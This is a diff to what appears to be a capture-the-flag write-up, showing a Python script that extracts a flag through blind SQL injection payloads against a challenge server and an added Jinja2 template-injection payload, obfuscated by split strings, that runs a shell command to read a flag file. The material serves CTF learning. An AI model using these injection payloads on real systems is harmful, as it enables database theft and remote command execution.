@@ -171,7 +171,7 @@ Script to find flag:
 import requests
 
 url = 'http://34.126.83.114:3390/api.php'
-partten = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{|}\"#$&\'()*+,-./:;<=>?@[\\]^`{|}~"
+partten = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!{|}_\"#$&\'()*+,-./:;<=>?@[\\]^`{|}~"
 
 def genpayload(i,s):
 	return f"' oR (suBstr((sElect value from flags),{i},1) like '{s}') union selecT 1,'1"
@@ -193,3 +193,9 @@ while True:
 
 While the CTF is running, I stuck in comparing password. So I cann't solve these challenges. I solve it after read hint in discord.
 
+Payload: 
+```
+payload={% set a=session.update({"a":lipsum['__glob' 'als__']['os']['popen']('head /flag')['re' 'ad']() })%}
+```
+
+## Updating...
